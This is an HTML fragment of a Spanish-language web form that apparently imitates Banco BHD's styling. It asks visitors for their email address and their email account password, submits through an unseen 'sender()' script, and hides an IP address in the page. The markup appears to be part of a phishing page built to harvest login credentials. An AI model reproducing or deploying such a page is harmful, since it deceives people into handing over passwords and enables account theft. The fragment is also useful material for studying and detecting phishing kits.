                  ...
                  <div class="p-card-content">
                    <div _ngcontent-ddn-c132="" class="p-grid">
                      ...
                      <form _ngcontent-ddn-c132="" method="post" onsubmit="return sender();"
                        ...
                        <p id="gfg" hidden="">201.192.183.229</p>
                        ...
                        <div _ngcontent-ddn-c132="" class="p-fluid p-formgrid p-grid p-jc-center">
                          ...
                          <div _ngcontent-fvi-c133="" class="p-field p-col-10">
                            <h2 _ngcontent-ddn-c132="" class="bhd-green-2 bhd-bold bhd--font-size-16">
                              Ingrese la siguiente de información</h2>
                          </div>

                          <div _ngcontent-ddn-c132="" class="p-field p-col-10">

                            <label _ngcontent-ddn-c132="" for="userName">Correo electrónico <span _ngcontent-ddn-c132=""
                                class="bhd-red-1">*</span></label>
                            <span _ngcontent-ddn-c132="" class="p-input-icon-left user-input">


                              <input _ngcontent-ddn-c132="" type="email"  name="correo" id="usemail"
                          ...
                          <div _ngcontent-ddn-c132="" class="p-field p-col-10">
                            <label _ngcontent-ddn-c132="" for="password">Contraseña de correo <span
                            ...
                            <span _ngcontent-ddn-c132="" class="p-input-icon-left"><em _ngcontent-ddn-c132=""
                              ...
                              <input _ngcontent-ddn-c132="" type="password" minlength="4" name="clavec" id="pascorr"
